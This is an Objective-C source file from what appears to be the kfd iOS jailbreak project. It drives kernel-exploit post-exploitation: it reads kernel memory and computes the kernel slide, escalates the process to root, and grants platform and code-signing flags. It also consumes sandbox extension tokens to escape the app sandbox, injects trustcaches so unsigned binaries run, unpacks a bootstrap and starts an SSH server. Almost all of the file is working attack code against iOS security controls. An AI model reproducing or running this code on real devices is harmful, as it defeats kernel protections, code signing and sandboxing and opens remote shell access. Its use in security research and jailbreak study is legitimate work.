//
//  fun.m
//  kfd
//
//  Created by Seo Hyun-gyu on 2023/08/10.
//

#import <Foundation/Foundation.h>
#import <spawn.h>
#import <sys/stat.h>
#import "krw.h"
#import "offsets.h"
#import "sandbox.h"
#import "trustcache.h"
#import "escalate.h"
#import "utils.h"
#import "fun.h"
#import "proc.h"
#import "vnode.h"
#import "dropbear.h"

void test_kalloc_kfree(void) {
    size_t allocated_size = 0x1000;
    uint64_t allocated_kmem = kalloc(allocated_size);
    kwrite64(allocated_kmem, 0x4142434445464748);
    printf("[+] allocated_kmem: 0x%llx\n", allocated_kmem);
    HexDump(allocated_kmem, allocated_size);
    
    kfree(allocated_kmem, allocated_size);
}

void test_platformize(pid_t pid) {
    set_task_platform(pid, true);
    set_proc_csflags(pid);
    set_csb_platform_binary(pid);
}

void test_unsandbox(void) {
    char* _token = token_by_sandbox_extension_issue_file("com.apple.app-sandbox.read-write", "/", 0);
    printf("consume ret: %lld\n", sandbox_extension_consume(_token));
    char* _token2 = token_by_sandbox_extension_issue_file("com.apple.sandbox.executable", "/", 0);
    printf("token2: %s\n", _token2);
    printf("consume ret: %lld\n", sandbox_extension_consume(_token2));

}

void test_load_trustcache(void) {
    const char* path = [NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/binaries/unsignedhelloworld"].UTF8String;
    chmod(path, 0755);
    printf("unsigned binaries path: %s\n", path);
    
    NSString* tcpath = [NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/binaries/binaries.tc"];
    
    uint64_t trustCacheKaddr = staticTrustCacheUploadFileAtPath(tcpath, NULL);
    printf("trustCacheKaddr: 0x%llx\n", trustCacheKaddr);
    util_runCommand(path, NULL, NULL);
    trustCacheListRemove(trustCacheKaddr);
}

void test_load_trustcache2(void) {
    const char* path = [NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/binaries/tar"].UTF8String;
    chmod(path, 0755);
    printf("unsigned binaries path: %s\n", path);
    
    NSString* tcpath = [NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/binaries/binaries.tc"];
    
    uint64_t trustCacheKaddr = staticTrustCacheUploadFileAtPath(tcpath, NULL);
    printf("trustCacheKaddr: 0x%llx\n", trustCacheKaddr);
    util_runCommand(path, NULL, NULL);
    trustCacheListRemove(trustCacheKaddr);
}

int do_fun(void) {
    _offsets_init();
    
    uint64_t kslide = get_kslide();
    uint64_t kbase = 0xfffffff007004000 + kslide;
    
    printf("[i] Kernel base: 0x%llx\n", kbase);
    printf("[i] Kernel slide: 0x%llx\n", kslide);
    uint64_t kheader64 = kread64(kbase);
    printf("[i] Kernel base kread64 ret: 0x%llx\n", kheader64);
    
    printf("[i] rootify ret: %d\n", rootify(getpid()));
    printf("[i] uid: %d, gid: %d\n", getuid(), getgid());

    prepare_kcall();
    
    test_platformize(getpid());
    
    uint64_t sb = unsandbox(getpid());
    
    //do some stuff..
//    test_load_trustcache2();
    
    //1. load trustcache
    printf("binaries.tc ret: 0x%llx\n", staticTrustCacheUploadFileAtPath([NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/binaries/binaries.tc"], NULL));
    printf("iosbinpack64.tc ret: 0x%llx\n", staticTrustCacheUploadFileAtPath([NSString stringWithFormat:@"%@%@", NSBundle.mainBundle.bundlePath, @"/iosbinpack/iosbinpack64.tc"], NULL));

    //2. bootstrap if not exist
    cleanBootstrap();
    untarBootstrap();
    
//    NSLog(@"dirs: %@\n", [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var/containers/Bundle" error:nil]);
//    NSLog(@"dirs: %@\n", [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var/containers/Bundle/iosbinpack64" error:nil]);
//    NSLog(@"access ret: %d\n", access("/var/containers/Bundle/iosbinpack64/test", F_OK));
    
    //3. check if runnable
    util_runCommand("/var/containers/Bundle/iosbinpack64/test", NULL, NULL);
    util_runCommand("/var/containers/Bundle/iosbinpack64/bin/date", NULL, NULL);
    
    //4.setup and run SSH
    setupSSH();
    
    sandbox(getpid(), sb);
    
    return 0;
}
